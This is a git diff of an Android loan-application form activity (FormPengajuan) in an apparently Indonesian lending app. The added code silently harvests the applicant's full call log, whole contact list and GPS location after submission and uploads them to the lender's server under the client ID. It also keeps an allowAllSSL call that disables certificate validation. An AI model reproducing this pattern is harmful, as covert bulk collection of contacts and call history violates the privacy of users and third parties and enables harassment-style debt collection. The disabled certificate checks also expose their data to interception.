@@ -2,7 +2,9 @@ package metis.winwin;
 
 import android.Manifest;
 import android.app.AlertDialog;
+import android.app.Dialog;
 import android.app.ProgressDialog;
+import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.Context;
 import android.content.DialogInterface;
@@ -11,14 +13,18 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.location.Location;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.StrictMode;
+import android.provider.ContactsContract;
 import android.provider.DocumentsContract;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.support.annotation.RequiresApi;
 import android.support.design.widget.TextInputLayout;
 import android.support.v4.app.ActivityCompat;
@@ -29,8 +35,9 @@ import android.support.v7.widget.Toolbar;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.util.Base64;
-import android.util.Log;
+import android.view.LayoutInflater;
 import android.view.View;
+import android.view.Window;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.AutoCompleteTextView;
@@ -59,6 +66,9 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.bumptech.glide.Glide;
 import com.codetroopers.betterpickers.calendardatepicker.CalendarDatePickerDialogFragment;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
 import com.weiwangcn.betterspinner.library.BetterSpinner;
 
 import org.json.JSONArray;
@@ -69,8 +79,10 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -80,10 +92,12 @@ import butterknife.ButterKnife;
 import butterknife.OnClick;
 import metis.winwin.Adapter.KelurahanAdapter;
 import metis.winwin.Adapter.OwnProgressDialog;
+import metis.winwin.Model.ContactModel;
 import metis.winwin.Model.FileModel;
 import metis.winwin.Model.KelurahanModel;
 import metis.winwin.Utils.AndLog;
 import metis.winwin.Utils.AppConf;
+import metis.winwin.Utils.CallLogHelper;
 import metis.winwin.Utils.DataPinjamanManager;
 import metis.winwin.Utils.DateTool;
 import metis.winwin.Utils.DecimalsFormat;
@@ -95,7 +109,6 @@ import metis.winwin.Utils.MediaProcess;
 import metis.winwin.Utils.SessionManager;
 import metis.winwin.Utils.VolleyHttp;
 
-import static metis.winwin.Utils.AppConf.RATING;
 import static metis.winwin.Utils.AppConf.UPLOADSELFI;
 import static metis.winwin.Utils.AppConf.URL_HQ;
 
@@ -402,14 +415,27 @@ public class FormPengajuan extends AppCompatActivity {
     private Uri mHighQualityImageUri;
     private final int PROS_ID = 8844;
     OwnProgressDialog loading;
-    String pilihan;
+    String id_client_hq;
+    boolean isUpload, isDialog;
+    LocationManager locationManager;
+    boolean GpsStatus;
+    Context context;
+    private FusedLocationProviderClient mFusedLocationClient;
+    String slat, slang, ctc_name, ctc_nomor, callNumber, callName, callDate, callType, duration;
+    private ArrayList<String> conNames;
+    private ArrayList<String> conNumbers;
+    private ArrayList<String> conTime;
+    private ArrayList<String> conDate;
+    private ArrayList<String> conType;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_form_pengajuan);
         ButterKnife.bind(this);
-
+        context = getApplicationContext();
+        isUpload = false;
+        isDialog = false;
         HttpsTrustManager.allowAllSSL();
         StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
         StrictMode.setVmPolicy(builder.build());
@@ -537,7 +563,7 @@ public class FormPengajuan extends AppCompatActivity {
         txNoTelpklgTdkSerumah.setText("08");
         txNoTelpklgTdkSerumah.setMaxEms(15);
 
-        Rating();
+
 
         txStatusKerja.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
             @Override
@@ -559,6 +585,371 @@ public class FormPengajuan extends AppCompatActivity {
 
             }
         });
+    }
+
+    private class LoadFromContactList extends AsyncTask<Void, String, ArrayList<ContactModel>> {
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+
+            //Log.i(TAG, "Load Contact");
+        }
+
+        @Override
+        protected ArrayList<ContactModel> doInBackground(Void... params) {
+            // TODO Auto-generated method stub
+
+            ArrayList<ContactModel> result = LihatContact();
+
+            return result;
+        }
+
+
+        @Override
+        protected void onPostExecute(final ArrayList<ContactModel> result) {
+            // TODO Auto-generated method stub
+            super.onPostExecute(result);
+            String data = "";
+            String compare = "";
+            for (int i = 0; i < result.size(); i++) {
+//                AndLog.ShowLog("ContactDetail", result.get(i).getNama() + " - " + result.get(i).getExtra());
+                AndLog.ShowLog("nama", ctc_name = result.get(i).getNama());
+                AndLog.ShowLog("nomer", ctc_nomor = result.get(i).getExtra());
+
+                if (!compare.equals(result.get(i).getExtra())) {
+                    data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + "), ";
+                }
+
+                compare = result.get(i).getExtra();
+
+            }
+            final String Contact = data;
+            StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVEKONTAK, new Response.Listener<String>() {
+
+                @Override
+                public void onResponse(String response) {
+                    UpdateLokasi();
+                }
+            }, new Response.ErrorListener() {
+
+                @Override
+                public void onErrorResponse(VolleyError error) {
+                    isUpload = false;
+                    if (!isDialog) {
+                        finish();
+                    }
+                }
+            }) {
+
+                @Override
+                protected Map<String, String> getParams() {
+
+                    Map<String, String> params = new HashMap<String, String>();
+
+                    params.put("ctc_data", Contact);
+                    params.put("id_client", id_client_hq);
+
+                    AndLog.ShowLog("husst", String.valueOf(params));
+                    return params;
+
+                }
+
+            };
+            requestQueue.add(strReq);
+        }
+
+
+    }
+
+    private ArrayList<ContactModel> LihatContact() {
+
+        ArrayList<ContactModel> tmpContact = new ArrayList<>();
+        ContactModel contactVO;
+        ContentResolver contentResolver = FormPengajuan.this.getContentResolver();
+        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+        if (cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+
+                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER)));
+                if (hasPhoneNumber > 0) {
+
+                    contactVO = new ContactModel();
+                    String fixPhone = "0";
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
+                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String mphone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+                    fixPhone = mphone.replace("+62", "0").replaceAll("\\D+", "");
+
+                    contactVO.setNama(name);
+                    contactVO.setExtra(fixPhone);
+
+
+                    tmpContact.add(contactVO);
+
+
+                }
+            }
+
+        }
+
+
+        return tmpContact;
+    }
+
+    private void getClientFromKTP() {
+
+        AndLog.ShowLog("idclientktp", AppConf.URL_GET_ID_CLIENT_KTP + txNoKtp.getText().toString());
+        stringRequest = new StringRequest(Request.Method.GET, AppConf.URL_GET_ID_CLIENT_KTP + txNoKtp.getText().toString(), new Response.Listener<String>() {
+
+            @Override
+            public void onResponse(String response) {
+                AndLog.ShowLog("id_client: ", response);
+                sessionManager.setIdhq(response);
+                id_client_hq = response;
+                callLog();
+
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                Toast.makeText(getApplicationContext(), error.getMessage(), Toast.LENGTH_SHORT).show();
+
+            }
+        });
+        requestQueue.add(stringRequest);
+    }
+
+    private void getCallLogs(Cursor curLog) {
+        String data = "";
+        while (curLog.moveToNext()) {
+            String finaldata = "";
+
+            callName = curLog
+                    .getString(curLog
+                            .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
+            if (callName == null) {
+//                conNames.add("Unknown");
+                finaldata = finaldata + "Unknown No : ";
+            } else {
+//            conNames.add(callName);
+                finaldata = finaldata + callName + " No : ";
+            }
+            callNumber = curLog.getString(curLog
+                    .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
+//            conNumbers.add(callNumber);
+            finaldata = finaldata + callNumber;
+
+            duration = curLog.getString(curLog
+                    .getColumnIndex(android.provider.CallLog.Calls.DURATION));
+//            conTime.add(duration);
+            finaldata = finaldata + " ( " + duration + " sec ) ";
+
+            callDate = curLog.getString(curLog
+                    .getColumnIndex(android.provider.CallLog.Calls.DATE));
+            SimpleDateFormat formatter = new SimpleDateFormat(
+                    "dd-MMM-yyyy HH:mm");
+            String dateString = formatter.format(new Date(Long
+                    .parseLong(callDate)));
+//            conDate.add(dateString);
+            finaldata = finaldata + dateString;
+
+            callType = curLog.getString(curLog
+                    .getColumnIndex(android.provider.CallLog.Calls.TYPE));
+            if (callType.equals("1")) {
+//                conType.add("Incoming");
+                finaldata = finaldata + " ( Incoming ) , ";
+            } else {
+//                conType.add("Outgoing");
+                finaldata = finaldata + " ( Outgoing ) , ";
+            }
+            data = data + finaldata;
+        }
+
+        final String CalLog = data;
+        StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVELOG, new Response.Listener<String>() {
+
+            @Override
+            public void onResponse(String response) {
+                contactLog();
+            }
+        }, new Response.ErrorListener() {
+
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                isUpload = false;
+                if (!isDialog) {
+                    finish();
+                }
+            }
+        }) {
+
+            @Override
+            protected Map<String, String> getParams() {
+
+                Map<String, String> params = new HashMap<String, String>();
+
+                params.put("log_data", CalLog);
+                params.put("id_client", id_client_hq);
+
+                AndLog.ShowLog("caloghzz", String.valueOf(params));
+                return params;
+
+            }
+
+        };
+        requestQueue.add(strReq);
+
+    }
+
+    public void contactLog() {
+
+        if (ActivityCompat.checkSelfPermission(FormPengajuan.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+
+            new LoadFromContactList().execute();
+        }
+    }
+
+    public void callLog() {
+
+        if (ActivityCompat.checkSelfPermission(FormPengajuan.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+
+            conNames = new ArrayList<String>();
+            conNumbers = new ArrayList<String>();
+            conTime = new ArrayList<String>();
+            conDate = new ArrayList<String>();
+            conType = new ArrayList<String>();
+            Cursor curLog = CallLogHelper.getAllCallLogs(getContentResolver());
+            getCallLogs(curLog);
+        }
+    }
+
+    public void CheckGpsStatus() {
+
+        if (ActivityCompat.checkSelfPermission(FormPengajuan.this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+            GpsStatus = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+            if (GpsStatus == true) {
+
+                locationLog();
+
+            } else {
+                Dialog();
+                Toast.makeText(context, "GPS IS NON ACTIVE", Toast.LENGTH_SHORT).show();
+            }
+
+        }
+    }
+
+    private void Dialog() {
+        final Dialog dialog = new Dialog(FormPengajuan.this);
+        LayoutInflater inflater = (LayoutInflater) FormPengajuan.this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
+        View view = inflater.inflate(R.layout.pop_up_dialog_gps, null);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        dialog.setContentView(view);
+
+        Button btnSubmit = (Button) view.findViewById(R.id.btActive);
+
+        btnSubmit.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                final Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
+                startActivity(intent);
+                dialog.dismiss();
+            }
+        });
+
+
+        dialog.getWindow().setBackgroundDrawableResource(R.drawable.corner_radius);
+        dialog.setCancelable(false);
+        dialog.show();
+    }
+
+    public void locationLog() {
+
+        if (ActivityCompat.checkSelfPermission(FormPengajuan.this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+
+
+            // Get the location manager
+//            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            // Define the criteria how to select the locatioin provider -> use
+            // default
+//            Criteria criteria = new Criteria();
+//            provider = locationManager.getBestProvider(criteria, false);
+//            Location location = locationManager.getLastKnownLocation(provider);
+//
+//            // Initialize the location fields
+//            if (location != null) {
+////                System.out.println("Provider " + provider + " has been selected.");
+////                onLocationChanged(location);
+//                Log.d("Locloclocloc", "Getting");
+//                if (sessionManager != null) {
+//                    if (sessionManager.checkLogin()) {
+//                        UpdateLokasi();
+//                    }
+//                }
+//            }
+
+            mFusedLocationClient = LocationServices.getFusedLocationProviderClient(FormPengajuan.this);
+            mFusedLocationClient.getLastLocation()
+                    .addOnSuccessListener(this, new OnSuccessListener<Location>() {
+                        @Override
+                        public void onSuccess(Location location) {
+                            // Got last known location. In some rare situations this can be null.
+                            if (location != null) {
+                                // Logic to handle location object
+                                double lat = location.getLatitude();
+                                double lng = location.getLongitude();
+
+                                slat = String.valueOf(lat);
+                                slang = String.valueOf(lng);
+
+                                if (sessionManager != null) {
+                                    if (sessionManager.checkLogin()) {
+
+                                    }
+                                }
+                            }
+                        }
+                    });
+        }
+    }
+
+    private void UpdateLokasi() {
+
+        StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.UPDATELOKIASI, new Response.Listener<String>() {
+
+            @Override
+            public void onResponse(String response) {
+                isUpload = false;
+                if (!isDialog) {
+                    finish();
+                }
+            }
+        }, new Response.ErrorListener() {
+
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                isUpload = false;
+                if (!isDialog) {
+                    finish();
+                }
+            }
+        }) {
+
+            @Override
+            protected Map<String, String> getParams() {
+
+                Map<String, String> params = new HashMap<String, String>();
+                params.put("cli_id", id_client_hq);
+                params.put("latitude", slat);
+                params.put("longitude", slang);
+
+                return params;
+            }
+
+        };
+        requestQueue.add(strReq);
     }
 
     public String getCurrentDate() {
@@ -731,24 +1122,36 @@ public class FormPengajuan extends AppCompatActivity {
                         } else if (image3 == null) {
                             GlobalToast.ShowToast(FormPengajuan.this, "Silahkan pilih foto buku rekening");
                             err++;
+                        } else if (decoded == null) {
+                            GlobalToast.ShowToast(FormPengajuan.this, "Silahkan mengambil gambar selfi");
+                            err++;
                         }
+
 //                        else if (image4 == null) {
 //                            GlobalToast.ShowToast(FormPengajuan.this, "Silahkan mengambil gambar selfi dengan ktp");
 //                            err++;
 //                        }
                     }
-                } else {
 
-
-                    if (err == 0) {
-                        if (image2 == null) {
-                            GlobalToast.ShowToast(FormPengajuan.this, "Silahkan pilih foto slip gaji");
-                            err++;
-                        }
-                    }
+//                    if (visible = false){
+//                        GlobalToast.ShowToast(FormPengajuan.this, "Silahkan mengambil gambar selfi dengan ktp");
+////                            err++;
+//                    }
 
 
                 }
+//                else {
+
+
+//                    if (err == 0) {
+//                        if (image2 == null) {
+//                            GlobalToast.ShowToast(FormPengajuan.this, "Silahkan pilih foto slip gaji");
+//                            err++;
+//                        }
+//                    }
+
+
+//                }
 
                 String sts_rmh = txStatusRumah.getText().toString();
                 switch (sts_rmh) {
@@ -845,12 +1248,12 @@ public class FormPengajuan extends AppCompatActivity {
 //                        task.execute();
 
                         UpdateSetujui();
-                        addselfi();
+
                     } else {
                         progressDialog.show();
                         SaveLog();
-                        AsyncTaskRunner task = new AsyncTaskRunner();
-                        task.execute();
+
+                        addselfi();
                     }
                 }
 
@@ -877,6 +1280,93 @@ public class FormPengajuan extends AppCompatActivity {
                     takeImageSelfi();
                 }
                 break;
+        }
+    }
+
+    private void SaveInputan() {
+        String sts_rmh = txStatusRumah.getText().toString();
+        switch (sts_rmh) {
+            case "Milik Sendiri":
+                status_rumah = "1";
+                break;
+            case "Milik Orang tua":
+                status_rumah = "5";
+                break;
+            case "Sewa Kos":
+                status_rumah = "10";
+                break;
+            case "Rumah Dinas / Mes Perusahaan / Lain-lain":
+                status_rumah = "20";
+                break;
+        }
+        if (!sessionManager.checkLogin()) {
+
+            String tgl_lhr = DateTool.changeFormat(txTglLahir.getText().toString(), "dd MMM yyyy", "yyyy-MM-dd");
+
+            String gj = txGajiPerbulan.getText().toString();
+            gj = gj.replace(".", "");
+            gj = gj.replace(",", "");
+
+            Map<String, String> params = new HashMap<String, String>();
+            params.put("amount", jumlah);
+            params.put("duration", periode);
+            params.put("jatuh_tempo", jatuh_tempo);
+            params.put("total", total_byr);
+
+            params.put("tujuan", spTujuan.getSelectedItem().toString());
+//                params.put("", txKuponDiskon.getText().toString());
+            params.put("nama_lengkap", txNamaLengkap.getText().toString());
+            params.put("jk", jk);
+            params.put("rt", txRT.getText().toString());
+            params.put("rw", txRW.getText().toString());
+            params.put("email", txEmail.getText().toString());
+            params.put("email_alternatif", txEmail.getText().toString());
+            params.put("password", txPassword.getText().toString());
+//                params.put("", txCPassword.getText().toString());
+            params.put("no_ktp", txNoKtp.getText().toString());
+            params.put("tgl_lahir", tgl_lhr);
+            params.put("tgl_lahir_label", txTglLahir.getText().toString());
+            params.put("alamat", txAlamatPelanggan.getText().toString());
+            params.put("kota", txKota.getText().toString());
+            params.put("kelurahan", txKelurahan.getText().toString());
+            params.put("kecamatan", txKecamatan.getText().toString());
+            params.put("kodepos", txKodePos.getText().toString());
+            params.put("status_rumah", status_rumah);
+            params.put("status_rumah_label", sts_rmh);
+            params.put("lama_tinggal_tahun", txLamaTahun.getText().toString());
+            params.put("lama_tinggal_bulan", txLamaBulan.getText().toString());
+            params.put("kode_area", txKodeArea.getText().toString());
+            params.put("telepon", txTelpRumah.getText().toString());
+            params.put("handphone", txHandPhone.getText().toString());
+            params.put("handphone_alternatif", txHandPhoneAlter.getText().toString());
+            params.put("jenis_pekerjaan", spinJenisPekerjaan.getText().toString());
+            params.put("perusahaan", txNamaPerusahaan.getText().toString());
+            params.put("posisi", txPosisi.getText().toString());
+            params.put("lama_bekerja", txLamaBekerja.getText().toString());
+            params.put("nama_hrd", txNamaHrd.getText().toString());
+            params.put("alamat_perusahaan", txAlamatPerusahaan.getText().toString());
+            params.put("kota_perusahaan", txKotaP.getText().toString());
+            params.put("status_kontrak", txStatusKerja.getSelectedItem().toString());
+            params.put("batas_kontrak", txBatasKontrak.getText().toString());
+            params.put("telepon_perusahaan", txTelpPerusahaan.getText().toString());
+            params.put("besar_gaji", gj);
+            params.put("tanggal_gajian", txTglGajian.getText().toString());
+            params.put("nama_keluarga_serumah", txNamaKlgSerumah.getText().toString());
+            params.put("telepon_keluarga_serumah", txNoTelpklgSerumah.getText().toString());
+            params.put("nama_keluarga_tidak_serumah", txNamaKlgRdkSerumah.getText().toString());
+            params.put("telepon_keluarga_tidak_serumah", txNoTelpklgTdkSerumah.getText().toString());
+            params.put("hubungan_keluarga_tidak_serumah", txHubunganKeluarga.getText().toString());
+            params.put("alamat_keluarga_tidak_serumah", txAlamatKlgTdkSerumah.getText().toString());
+            params.put("nama_pemilik_rekening", txNamaPemilikRek.getText().toString());
+            params.put("nama_bank", spBank.getSelectedItem().toString());
+            params.put("lokasi_cabang_bank", txCabang.getText().toString());
+            params.put("nomor_rekening", txNoRekening.getText().toString());
+
+            JSONObject json = new JSONObject(params);
+            DataPinjamanManager dataPinjamanManager = new DataPinjamanManager(FormPengajuan.this);
+            dataPinjamanManager.clearData();
+            dataPinjamanManager.createData(json.toString());
+
         }
     }
 
@@ -1014,28 +1504,6 @@ public class FormPengajuan extends AppCompatActivity {
                 jk = "perempuan";
                 break;
         }
-    }
-
-    private void Rating() {
-        String idclient = new SessionManager(FormPengajuan.this).getIduser();
-        Map<String, String> params = new HashMap<String, String>();
-
-        stringRequest = new StringRequest(Request.Method.GET, RATING + idclient, new Response.Listener<String>() {
-
-            @Override
-            public void onResponse(String response) {
-                Log.d("jjj", response);
-
-//                sBunga = Float.parseFloat(response);
-            }
-        }, new Response.ErrorListener() {
-            @Override
-            public void onErrorResponse(VolleyError error) {
-                Toast.makeText(FormPengajuan.this, error.getMessage(), Toast.LENGTH_SHORT).show();
-
-            }
-        });
-        requestQueue.add(stringRequest);
     }
 
     private void InitSpin() {
@@ -1502,29 +1970,19 @@ public class FormPengajuan extends AppCompatActivity {
     }
 
     private void addselfi() {
-        loading.show();
+
         StringRequest strReq = new StringRequest(Request.Method.POST, UPLOADSELFI, new Response.Listener<String>() {
 
             @Override
             public void onResponse(String response) {
 
-                Toast.makeText(FormPengajuan.this, "Berhasil Di Input Ke database", Toast.LENGTH_SHORT).show();
-                loading.dismiss();
-                finish();
-                try {
-                    final JSONObject jObj = new JSONObject(response.toString());
-
-                    if (response.equals("Berhasil")) {
-                        Toast.makeText(FormPengajuan.this, "Berhasil Di Input Ke database", Toast.LENGTH_SHORT).show();
-
+                if (response.equals("Berhasil")) {
+                    AsyncTaskRunner task = new AsyncTaskRunner();
+                    task.execute();
                     } else {
-                        Toast.makeText(FormPengajuan.this,
-                                jObj.getString("message"), Toast.LENGTH_LONG).show();
+                    progressDialog.dismiss();
+                    GlobalToast.ShowToast(FormPengajuan.this, "Gagal, Silahkan Coba Kembali");
 
-                    }
-                } catch (JSONException e) {
-                    // JSON error
-                    e.printStackTrace();
                 }
 
             }
@@ -1532,12 +1990,8 @@ public class FormPengajuan extends AppCompatActivity {
 
             @Override
             public void onErrorResponse(VolleyError error) {
-                Log.d("Error: ", error.getMessage());
-                Toast.makeText(getApplicationContext(),
-                        error.getMessage(), Toast.LENGTH_LONG).show();
-
-                loading.dismiss();
-
+                GlobalToast.ShowToast(FormPengajuan.this, "Gagal, Silahkan Coba Kembali");
+                progressDialog.dismiss();
             }
         }) {
 
@@ -1603,6 +2057,12 @@ public class FormPengajuan extends AppCompatActivity {
         requestQueue.add(stringRequest);
 
 
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        CheckGpsStatus();
     }
 
     private void spinBank() {
@@ -1868,7 +2328,7 @@ public class FormPengajuan extends AppCompatActivity {
                     String error = jo.getString("error");
 
                     if (error.equals("false")) {
-
+                        isDialog = true;
                         AlertDialog.Builder builder = new AlertDialog.Builder(FormPengajuan.this);
 
                         builder.setTitle("Berhasil");
@@ -1876,16 +2336,24 @@ public class FormPengajuan extends AppCompatActivity {
                         if (sessionManager.checkLogin()) {
                             builder.setMessage(getString(R.string.pengajuan_success));
                         } else {
+                            isUpload = true;
+                            getClientFromKTP();
                             builder.setMessage(getString(R.string.pengajuan_success_baru));
+
                         }
 
                         builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
 
                             public void onClick(DialogInterface dialog, int which) {
 
+                                isDialog = false;
                                 dialog.dismiss();
-
-                                finish();
+                                if (isUpload) {
+                                    loading.show();
+                                } else {
+                                    loading.dismiss();
+                                    finish();
+                                }
                             }
                         });
 
@@ -2147,7 +2615,7 @@ public class FormPengajuan extends AppCompatActivity {
                         MediaProcess.bitmapToFile(bmp, outFileKTP.getAbsolutePath(), 30);
                         image1 = outFileKTP.getAbsolutePath();
                         txKtp.setVisibility(View.GONE);
-
+                        SaveInputan();
                         break;
                     case PICK_SLIP_REQUEST:
                         img = imgSlip;
@@ -2206,6 +2674,7 @@ public class FormPengajuan extends AppCompatActivity {
                         Glide.with(FormPengajuan.this).load(outFileKTP.getAbsolutePath()).into(imgKtp);
                         image1 = outFileKTP.getAbsolutePath();
                         txKtp.setVisibility(View.GONE);
+                        SaveInputan();
                     }
 
 
@@ -2259,40 +2728,54 @@ public class FormPengajuan extends AppCompatActivity {
             }
         }
 
-//        if (requestCode == TAKE_IMAGE4 && resultCode == RESULT_OK) {
-//            if (btSelfiTake.isClickable()) {
-//                try {
-//                    if (mHighQualityImageUri == null) {
-//                        GlobalToast.ShowToast(FormPengajuan.this, "Gagal memuat gambar, silahkan coba kembali.");
-//                    } else {
-//                        Bitmap bmp = MediaStore.Images.Media.getBitmap(getContentResolver(), mHighQualityImageUri);
-//                        MediaProcess.bitmapToFile(bmp, outFileSelfi.getAbsolutePath(), 30);
-//                        scale = MediaProcess.scaledBitmap(outFileSelfi.getAbsolutePath());
-//                        MediaProcess.bitmapToFile(scale, outFileSelfi.getAbsolutePath(), 30);
-//                        Glide.with(FormPengajuan.this).load(outFileSelfi.getAbsolutePath()).into(imgSelfi);
-//                        image4 = outFileSelfi.getAbsolutePath();
-//                        txSelfi.setVisibility(View.GONE);
-//                    }
-//                } catch (IOException e) {
-//                    e.printStackTrace();
-//                }
-//            }
-//        }
-
         if (requestCode == TAKE_IMAGE4 && resultCode == RESULT_OK) {
             if (btSelfiTake.isClickable()) {
-                Bitmap bitmap = (Bitmap) data.getExtras().get("data");
-                setToImageView(bitmap);
+                try {
+                    if (mHighQualityImageUri == null) {
+                        GlobalToast.ShowToast(FormPengajuan.this, "Gagal memuat gambar, silahkan coba kembali.");
+                    } else {
+                        Bitmap bmp = MediaStore.Images.Media.getBitmap(getContentResolver(), mHighQualityImageUri);
+                        MediaProcess.bitmapToFile(bmp, outFileSelfi.getAbsolutePath(), 30);
+                        scale = MediaProcess.scaledBitmap(outFileSelfi.getAbsolutePath());
+                        MediaProcess.bitmapToFile(scale, outFileSelfi.getAbsolutePath(), 30);
+                        Glide.with(FormPengajuan.this).load(outFileSelfi.getAbsolutePath()).into(imgSelfi);
+                        image4 = outFileSelfi.getAbsolutePath();
+                        txSelfi.setVisibility(View.GONE);
+
+                        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+                        scale.compress(Bitmap.CompressFormat.JPEG, bitmap_size, bytes);
+                        decoded = BitmapFactory.decodeStream(new ByteArrayInputStream(bytes.toByteArray()));
+//                        imgSelfi.setImageBitmap(decoded);
+//                        Glide.with(FormPengajuan.this).load(outFileSelfi.getAbsolutePath()).into(imgSelfi);
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
         }
+
+//        if (requestCode == TAKE_IMAGE4 && resultCode == RESULT_OK) {
+//            if (btSelfiTake.isClickable()) {
+//                Bitmap bitmap = (Bitmap) data.getExtras().get("data");
+//                setToImageView(bitmap);
+//                txSelfi.setText(null);
+//
+//            }
+//        }
     }
 
     private void setToImageView(Bitmap bmp) {
-        //compress image
-        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
-        bmp.compress(Bitmap.CompressFormat.JPEG, bitmap_size, bytes);
-        decoded = BitmapFactory.decodeStream(new ByteArrayInputStream(bytes.toByteArray()));
-        imgSelfi.setImageBitmap(decoded);
+//        //compress image
+//        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+//        bmp.compress(Bitmap.CompressFormat.JPEG, bitmap_size, bytes);
+//        decoded = BitmapFactory.decodeStream(new ByteArrayInputStream(bytes.toByteArray()));
+//        imgSelfi.setImageBitmap(decoded);
+        FileModel fileModel = generateTimeStampPhotoFileUri();
+        mHighQualityImageUri = fileModel.getUriPath();
+        outFileSelfi = fileModel.getFilePath();
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        intent.putExtra(MediaStore.EXTRA_OUTPUT, mHighQualityImageUri);
+        startActivityForResult(intent, TAKE_IMAGE4);
     }
 
     public void takeImageKTP(View view) {
@@ -2336,8 +2819,16 @@ public class FormPengajuan extends AppCompatActivity {
 //        startActivityForResult(intent, TAKE_IMAGE4);
 //    }
     public void takeImageSelfi() {
-        Intent cameraIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
-        startActivityForResult(cameraIntent, TAKE_IMAGE4);
+//        Intent cameraIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+//        startActivityForResult(cameraIntent, TAKE_IMAGE4);
+
+        FileModel fileModel = generateTimeStampPhotoFileUri();
+        mHighQualityImageUri = fileModel.getUriPath();
+        outFileSelfi = fileModel.getFilePath();
+        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+        intent.putExtra(MediaStore.EXTRA_OUTPUT, mHighQualityImageUri);
+        startActivityForResult(intent, TAKE_IMAGE4);
+       
     }
 
     @RequiresApi(api = Build.VERSION_CODES.KITKAT)
@@ -2549,5 +3040,37 @@ public class FormPengajuan extends AppCompatActivity {
         }
 
         return allowed;
+    }
+
+    @Override
+    public void onBackPressed() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(FormPengajuan.this);
+
+//        builder.setTitle("Logout");
+        builder.setMessage("Anda yakin akan keluar dari halaman ini!?" + "\n" + "Data anda akan kami simpan sementara di halaman ini");
+
+        builder.setPositiveButton("Ya", new DialogInterface.OnClickListener() {
+
+            public void onClick(DialogInterface dialog, int which) {
+
+                SaveInputan();
+                dialog.dismiss();
+
+                finish();
+            }
+        });
+
+        builder.setNegativeButton("Tidak", new DialogInterface.OnClickListener() {
+
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+
+                // Do nothing
+                dialog.dismiss();
+            }
+        });
+
+        AlertDialog alert = builder.create();
+        alert.show();
     }
 }
